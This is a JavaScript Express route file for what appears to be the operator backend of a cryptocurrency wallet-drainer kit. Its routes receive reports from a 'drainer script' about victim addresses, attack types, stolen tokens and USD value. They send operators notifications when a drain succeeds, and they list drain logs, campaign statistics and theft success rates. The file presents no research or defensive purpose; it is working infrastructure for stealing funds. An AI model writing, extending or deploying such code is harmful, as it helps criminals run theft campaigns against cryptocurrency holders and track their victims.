/**
 * ============================================================================
 * SERAPH SERVER - Drain Routes (v2 - With Notifications)
 * ============================================================================
 */

import { Router } from 'express'
import { requireOperator, optionalAuth } from '../middleware/auth.js'
import drainService from '../services/drain.service.js'
import notificationService from '../services/notification.service.js'
import supabase from '../config/supabase.js'
import { success, badRequest, notFound, paginated } from '../utils/response.js'

const router = Router()

/**
 * POST /drains/report
 * Report a drain attempt (from drainer script)
 * Public endpoint - authenticated by campaign key
 * 
 * UPDATED: Now sends notifications on successful drains
 */
router.post('/report', async (req, res) => {
  try {
    const {
      campaignKey,
      victimAddress,
      attackType,
      tokens,
      ethAmount,
      totalValueUsd,
      txHash,
      status,
      blockedBy,
      chainId
    } = req.body

    if (!campaignKey || !victimAddress || !attackType) {
      return badRequest(res, 'campaignKey, victimAddress, and attackType are required')
    }

    const drain = await drainService.reportDrain({
      campaignKey,
      victimAddress,
      attackType,
      tokens,
      ethAmount,
      totalValueUsd,
      txHash,
      status,
      blockedBy,
      chainId,
      ipAddress: req.ip,
      userAgent: req.get('user-agent')
    })

    // =========================================================================
    // NOTIFICATION: Drain Success (for successful drains reported by frontend)
    // Fire-and-forget (non-blocking)
    // =========================================================================
    if (status === 'success' && txHash) {
      try {
        // Get campaign and operator info for notification
        const [campaign, operator] = await Promise.all([
          notificationService.getCampaignInfo(drain.campaign_id),
          notificationService.getOperatorSettings(drain.operator_id)
        ])

        notificationService.notifyDrainSuccess({
          operatorId: drain.operator_id,
          victimAddress,
          attackType,
          totalValueUsd: parseFloat(totalValueUsd) || 0,
          txHash,
          campaignName: campaign?.name,
          operatorUsername: operator?.username
        })

        console.log(`[Notification] Drain success notification queued for ${drain.id}`)
      } catch (notifyErr) {
        // Never let notification errors break the main flow
        console.error('[Notification] Failed to queue drain notification:', notifyErr.message)
      }
    }
    // =========================================================================

    return success(res, { id: drain.id }, 'Drain reported')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * PUT /drains/:id/status
 * Update drain status (from drainer script or operator)
 * 
 * UPDATED: Now sends notifications when status changes to 'success'
 */
router.put('/:id/status', optionalAuth, async (req, res) => {
  try {
    const { status, txHash, blockedBy, errorMessage } = req.body

    if (!status) {
      return badRequest(res, 'Status is required')
    }

    const drain = await drainService.updateDrainStatus(req.params.id, {
      status,
      txHash,
      blockedBy,
      errorMessage
    })

    // =========================================================================
    // NOTIFICATION: On status change to success
    // =========================================================================
    if (status === 'success' && txHash) {
      try {
        const [campaign, operator] = await Promise.all([
          notificationService.getCampaignInfo(drain.campaign_id),
          notificationService.getOperatorSettings(drain.operator_id)
        ])

        notificationService.notifyDrainSuccess({
          operatorId: drain.operator_id,
          victimAddress: drain.victim_address,
          attackType: drain.attack_type,
          totalValueUsd: parseFloat(drain.total_value_usd) || 0,
          txHash,
          campaignName: campaign?.name,
          operatorUsername: operator?.username
        })

        console.log(`[Notification] Drain success notification queued for ${drain.id}`)
      } catch (notifyErr) {
        console.error('[Notification] Failed to queue drain notification:', notifyErr.message)
      }
    }
    // =========================================================================

    return success(res, drain, 'Status updated')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

// Protected routes below
router.use(requireOperator)

/**
 * GET /drains
 * List operator's drain logs
 */
router.get('/', async (req, res) => {
  try {
    const {
      page = 1,
      limit = 20,
      status,
      attackType,
      campaignId,
      startDate,
      endDate
    } = req.query

    const result = await drainService.getDrainLogs(req.user.id, {
      page: parseInt(page),
      limit: parseInt(limit),
      status,
      attackType,
      campaignId,
      startDate,
      endDate
    })

    return paginated(res, result.drains, {
      page: result.page,
      limit: result.limit,
      total: result.total
    })
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /drains/recent
 * Get recent drains
 */
router.get('/recent', async (req, res) => {
  try {
    const { limit = 10 } = req.query
    const drains = await drainService.getRecentDrains(req.user.id, parseInt(limit))
    return success(res, drains)
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /drains/stats
 * Get operator stats
 */
router.get('/stats', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('operators')
      .select('total_drains, successful_drains, blocked_drains, total_value_usd')
      .eq('id', req.user.id)
      .single()

    if (error) throw new Error(error.message)

    return success(res, {
      ...data,
      successRate: data.total_drains > 0
        ? ((data.successful_drains / data.total_drains) * 100).toFixed(2)
        : 0
    })
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /drains/:id
 * Get drain details
 */
router.get('/:id', async (req, res) => {
  try {
    const drain = await drainService.getDrainById(req.params.id, req.user.id)
    return success(res, drain)
  } catch (err) {
    return notFound(res, err.message)
  }
})

export default router